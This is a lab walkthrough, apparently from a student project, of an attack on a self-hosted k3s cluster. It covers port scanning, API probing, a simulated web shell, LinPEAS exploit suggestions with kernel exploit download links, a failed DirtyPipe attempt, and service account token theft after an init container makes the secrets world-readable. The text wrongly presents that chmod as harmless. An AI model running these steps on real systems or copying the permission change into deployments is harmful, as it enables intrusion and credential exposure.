---
title: 4-Attack Scenario
---

We're going to explore an engaging scenario that unfolds within a Kubernetes cluster, beginning with the knowledge of a domain name.

>[!tip]
>If you struggle with any of the concepts presented here, [[attackGlossary|this glossary]] got you covered. 

Consider this: you know the domain name of an application that’s part of a Kubernetes setup. Curious about what it can reveal? We start by listing out service ports using a tool known as Nmap. But wait—why is this important? Knowing which ports are open can give us a peek into the services that the application communicates with. Let’s see it in action, using the domain `k3s-vm-1-m.aitbyteshome.net`:

```sh
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 
k3s-vm-1-m.aitbyteshome.net

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 22:11 CET
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 28.15% done; ETC: 22:11 (0:00:13 remaining)
Nmap scan report for k3s-vm-1-m.aitbyteshome.net (35.195.218.184)
Host is up (0.052s latency).
Other addresses for k3s-vm-1-m.aitbyteshome.net (not scanned): 64:ff9b::23c3:dab8
Not shown: 2780 filtered tcp ports (no-response)
PORT      STATE  SERVICE
6443/tcp  open   sun-sr-https

Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds
```

Interestingly, port 6443 is open. This is where the Kubernetes API usually resides, and it’s how administrators manage applications using tools like kubectl. Curious about what might happen if we access it?

```sh
$ curl -k https://k3s-vm-1-m.aitbyteshome.net:6443/swaggerapi
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}                                                                                                       
 
$ curl -k https://k3s-vm-1-m.aitbyteshome.net:6443/healthz   
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}                                                                                                       
 
$ curl -k https://k3s-vm-1-m.aitbyteshome.net:6443/api/v1 
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}      

```

Unauthorized access! It’s just a reminder of the robust security in place to safeguard these systems.

Let’s explore further. How about checking responses from another crucial component, the Kubelet API? This API plays a vital role in managing node functions.

```
$ curl -k https://k3s-vm-4-w.aitbyteshome.net:10250/pods
$ curl -k https://k3s-vm-4-w.aitbyteshome.net:10250/metrics
curl: (28) Failed to connect to k3s-vm-4-w.aitbyteshome.net port 10250 after 132981 ms: Could not connec
t to server
```

But as it turns out, not all requests succeed. In this case, our attempts hit a wall; the connection doesn’t get through. It’s a clear indication that the services are protected from unauthorized access.

Let’s speculate a bit deeper—imagine if the application developers left a vulnerability that allowed remote code execution (RCE). For the sake of our scenario, visualize deploying a tool like p0wny@shell to simulate this vulnerability. Excited to find out what this could reveal?

![p0wny@shell](/home/a8taleb/dev/s9/Projet-Long/Infra/assets/2025-03-02-23-04-22.png)

Once inside, we could run an enumeration tool, such as Linepeas, to uncover potential paths for privilege escalation.

```sh
 ╔══════════╣ Executing Linux Exploit Suggester
 ╚ https://github.com/mzet-/linux-exploit-suggester
 [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

    Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
 https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Exposure: less probable
    Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
    Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

 [+] [CVE-2022-2586] nft_object UAF

    Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
    Exposure: less probable
    Tags: ubuntu=(20.04){kernel:5.12.13}
    Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

 [+] [CVE-2022-0847] DirtyPipe

    Details: https://dirtypipe.cm4all.com/
    Exposure: less probable
    Tags: ubuntu=(20.04|21.04),debian=11
    Download URL: https://haxx.in/files/dirtypipez.c

 [+] [CVE-2021-22555] Netfilter heap out-of-bounds write

    Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
    Exposure: less probable
    Tags: ubuntu=20.04{kernel:5.8.0-*}
    Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
    Comments: ip_tables kernel module must be loaded

```

One vulnerability that really stands out is DirtyPipe (CVE-2022-0847), known for its broad impact if exploitable.

However, attempts to exploit DirtyPipe might hit a snag due to security mechanisms that block certain system calls.

```
# ./dirtycow/exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
system() function call seems to have failed :(
```

Feeling thwarted? It might seem like a dead end, but it’s actually a testament to the defenses in place to prevent unauthorized privilege escalations.

So, what’s next? We adjust our tactics. By configuring file permissions, say with a Kubernetes init container, we can provide the necessary access to secure areas, like service account credentials, without endangering overall security:

Key Changes:

 - Init Container: Added an initContainer named init-permissions which uses a busybox image to change the permissions on the service account directory to be readable by others. It runs the command chmod -R o+r /run/secrets/kubernetes.io/serviceaccount.

```yml
      initContainers:
      - name: init-permissions
        image: busybox
        command: ["sh", "-c", "chmod -R o+r /run/secrets/kubernetes.io/serviceaccount"]
        volumeMounts:
        - mountPath: /run/secrets/kubernetes.io/serviceaccount
          name: serviceaccount-volume
      containers:
      # Rest ...
```

 - Volume Mounts: Added a volumeMount for the initContainer for the service account directory.
 
```yml
        volumeMounts:
        - mountPath: /var/www/html
          name: apache-volume
        #Added :
        - mountPath: /run/secrets/kubernetes.io/serviceaccount
          name: serviceaccount-volume
          readOnly: true


```

 - Projected Volume: Defined the service account as a projected volume which mounts it into the container and the initContainer so they can apply the permissions.
 ```yml
      volumes:
      - name: apache-volume
        hostPath:
          path: /home/user/html-files/
          type: DirectoryOrCreate
      # Added : 
      - name: serviceaccount-volume
        projected:
          sources:
          - serviceAccountToken:
              path: ..
              expirationSeconds: 3600

```

With controlled access, we can explore more doors within Kubernetes, securely obtaining authenticated access using service account tokens, which grant us visibility into what actions can be executed.

```sh
$ export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ curl -k --header "Authorization: Bearer $TOKEN" https://k3s-vm-1-m.aitbyteshome.net:6443/api

{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "10.132.15.229:6443"
    }
  ]
```

If you hit a "forbidden" wall when trying to access sensitive resources like role bindings, don’t worry. It’s simply a part of Kubernetes’ security measures. But think about the power in understanding how these security layers are built and managed.

```sh
# curl -k --header "Authorization: Bearer $TOKEN" https://k3s-vm-1-m.aitbyteshome.net:6443/apis/rbac.authorization.k8s.io/v1/rolebindings 
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "rolebindings.rbac.authorization.k8s.io is forbidden: User \"system:serviceaccount:default:default\" cannot list reso
urce \"rolebindings\" in API group \"rbac.authorization.k8s.io\" at the cluster scope",
  "reason": "Forbidden",
  "details": {
    "group": "rbac.authorization.k8s.io",
    "kind": "rolebindings"
  },
  "code": 403
}
# curl -k --header "Authorization: Bearer $TOKEN" https://k3s-vm-1-m.ait
yteshome.net:6443/apis/rbac.authorization.k8s.io/v1/clusterrolebindings
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "clusterrolebindings.rbac.authorization.k8s.io is forbidden: User \"system:serviceaccount:default:default\" cannot li
st resource \"clusterrolebindings\" in API group \"rbac.authorization.k8s.io\" at the cluster scope",
  "reason": "Forbidden",
  "details": {
    "group": "rbac.authorization.k8s.io",
    "kind": "clusterrolebindings"
  },
  "code": 403
}
```

These errors indicate that the default service account in the default namespace doesn't have sufficient permissions to list RoleBindings and ClusterRoleBindings at the cluster scope. This is expected as part of Kubernetes' security model.

